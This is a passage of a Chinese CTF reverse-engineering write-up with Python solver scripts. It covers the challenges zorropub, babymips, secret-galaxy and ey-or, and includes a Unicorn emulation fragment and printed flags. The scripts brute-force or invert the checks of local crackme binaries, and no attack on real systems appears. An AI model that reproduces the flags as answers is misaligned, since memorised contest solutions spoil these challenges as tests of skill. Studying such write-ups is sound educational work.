    data=open('/tmp/gef-0xf7ffb000.raw', 'r').read()
    emu.mem_write(0xf7ffb000, data)

    emu.mem_map(0xf7ffc000, 4096, 1)
    # Importing /lib/i386-linux-gnu/ld-2.23.so: 0xf7ffc000-0xf7ffd000
    data=open('/tmp/gef-0xf7ffc000.raw', 'r').read()
    emu.mem_write(0xf7ffc000, data)

    emu.mem_map(0xf7ffd000, 4096, 3)
    # Importing /lib/i386-linux-gnu/ld-2.23.so: 0xf7ffd000-0xf7ffe000
    data=open('/tmp/gef-0xf7ffd000.raw', 'r').read()
    emu.mem_write(0xf7ffd000, data)

    emu.mem_map(0xfffdd000, 135168, 3)
    # Importing [stack]: 0xfffdd000-0xffffe000
    data=open('/tmp/gef-0xfffdd000.raw', 'r').read()
    emu.mem_write(0xfffdd000, data)

    emu.hook_add(unicorn.UC_HOOK_CODE, hook_code)


    try:
        emu.emu_start(0x80485b1, 0x80486e0)
    except Exception as e:
        emu.emu_stop()
        print('Error: {}'.format(e))

    return emu


def find_init_randint():
    for i in range(256):
        emu = emulate(i)
        mem = emu.mem_read(0xffffd26c, 0x100)
        if mem[ord('T')]==0x95 and mem[ord('W')]==0xee:
            return i
    return None


init = find_init_randint()
if init is None:
    sys.exit(1)
t = "95eeaf95ef94234999582f722f492f72b19a7aaf72e6e776b57aee722fe77ab5ad9aaeb156729676ae7a236d99b1df4a".decode("hex")
emu = emulate(init)
c = emu.mem_read(0xffffd26c, 0x100)
b = ""
for i in range(len(t)):
    j = c.find(t[i])
    b+= chr(j)
print(b)

```

```
TWCTF{5UBS717U710N_C1PH3R_W17H_R4ND0M123D_5-B0X}
```

## zorropub

MD5爆破

```
import subprocess
ans = list()
for seed in range(0, 0xffff):
    count = 0
    keep = seed
    while seed:
        count += 1
        seed &= (seed-1)
    if count == 10:
        ans.append(keep)

print(ans)
for i in ans:
    proc = subprocess.Popen(['./zorro_bin'], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    out = proc.communicate(('1\n%s\n' % i).encode('utf-8'))[0]
    if "nullcon".encode('utf-8') in out:
        print(out)
```

## babymips

mips程序用Ghidra更方便

![80.png](https://i.loli.net/2019/08/09/qmVjSR8Ndei3t5z.png)

首先对输入进行异或(0x20-idx)的操作

![82.png](https://i.loli.net/2019/08/09/EIj64ruBghJtDsW.png)

然后对比前5个字符

![81.png](https://i.loli.net/2019/08/09/ASn7MfcPvGhNKk8.png)

接着在比较函数中，从第6个字符开始，对单数idx的进行循环右移2位，对双数idx的进行循环左移2位，这里都是在8bits范围内进行

![83.png](https://i.loli.net/2019/08/09/yzjlxDTOYeoMinq.png)

然后对后续内容进行比较

```python
a = [ord('Q'), ord('|'), ord('j'), ord('{'), ord('g'), 0x52, 0xfd, 0x16, 0xa4, 0x89, 0xbd, 0x92, 0x80, 0x13, 0x41, 0x54, 0xa0,
     0x8d, 0x45, 0x18, 0x81, 0xde, 0xfc, 0x95, 0xf0, 0x16, 0x79, 0x1a, 0x15, 0x5b, 0x75, 0x1f]

c = ''
for i in range(5, len(a)):
    x = a[i]
    if i & 1 == 0:
        u = x & 3
        u = (u << 6) & 0xff
        v = x >> 2
        a[i] = u | v
    else:
        u = x & 192
        u = u >> 6
        v = (x << 2) & 0xff
        a[i] = u | v


b = 'Q|j{g'
for i in range(32):
    print(chr((a[i]) ^ (0x20 - i)), end='')
```

写个python脚本逆向

![84.png](https://i.loli.net/2019/08/09/LJq94vCNtIFoUVp.png)

## secret-galaxy

![90.png](https://i.loli.net/2019/08/09/ZQExtkOm2TrwIvR.png)

打开发现没啥东西， 也没给我们输入

![91.png](https://i.loli.net/2019/08/09/v1d4nwrikGMsehK.png)

OD进去下个断点搜下内存字符串，看到一个貌似flag的，提交对了就是他

## ey-or

这个二进制包含一个标志，提取它！

确实要提取，IDA打开发现不能识别，但是在linux中却还是可以运行，IDA中可以看到很多字符串，

提取出来的这一段比较完整

```
] ==secret
] ==f
 secret len ==l
 [ ] ==buffer
 0 ==i
 0 ==j
 "Enter Password line by line\n" sys .out .writeall
  #str .fromArray secret bxor
  txt .consume .u
  =j
[ buffer _ len dearray j ] =buffer
[ secret _ len dearray j eq { } { 1 sys .exit } ? * ] =secret
  i 1 add =i
  i l eq {
  buffer f bxor str .fromArray sys .out .writeall
 0 sys .exit
} { } ? *
} sys .in .eachLine
"ey_or" sys .freeze
```

其实看着还是很怪，根本不懂，看了看网上的WP，说是Elymas

```
secret = [ ???? ]
f = [ ???? ]
l = len(secret)
buffer = []
i = 0
j = 0
print "Enter Password line by line"
for line in sys.stdin.readlines():
    j = read_int(line)
    buffer = buffer + [j]
    if secret[i] != j:
        sys.exit(1)
    i += 1
    if i == l:
        print to_string(map(lambda x,y: x^y, buffer, f))
        sys.exit(0)
```

可是这里secret数组我们并不知道，但是可以知道只要我们输入的是正确的，程序就会接着让我们输入，所以我们可以逐个爆破，网上题解这里利用了subprocess库

```python
import sys
import subprocess

ans = []
while True:
    for j in range(256):
        if j % 16 == 15:
            print j
        p = subprocess.Popen("./ey_or.elf", stdin=subprocess.PIPE, stdout=subprocess.PIPE)
        for x in ans:
            p.stdin.write(str(x) + '\n')
        p.stdin.write(str(j) + '\n')
        p.stdin.close()
        ret = p.wait()
        if ret != 1:
            ans.append(j)
            print ans
            break
```

解出正确的序列

```
[36, 30, 156, 30, 43, 6, 116, 22, 211, 66, 151, 89, 36, 82, 254, 81, 182, 134, 24, 90, 119, 6, 88, 137, 64, 197, 251, 15, 116, 220, 161, 94, 154, 252, 139, 11, 41, 215, 27, 158, 143, 140, 54, 189, 146, 48, 167, 56, 84, 226, 15, 188, 126, 24]
```

我自己用pwntools实现了爆破脚本

```python
from pwn import *

ans = list()

context.log_level = 'ERROR'


def bp():
    while 1:
        for i in range(256):
            p = process("./ey_or")
            p.recv()
            for j in ans:
                p.sendline(str(j))
            p.sendline(str(i))
            try:
                flag = str(p.recv(timeout=1)).replace(' ', '')
                ans.append(i)
                print ans
                if flag != '':
                    return flag
                p.close()
                break
            except:
                p.close()
                continue


print bp()
```

跑了一会出现flag

![101.png](https://i.loli.net/2019/08/09/Ca4tWHjDmVQxLqf.png)

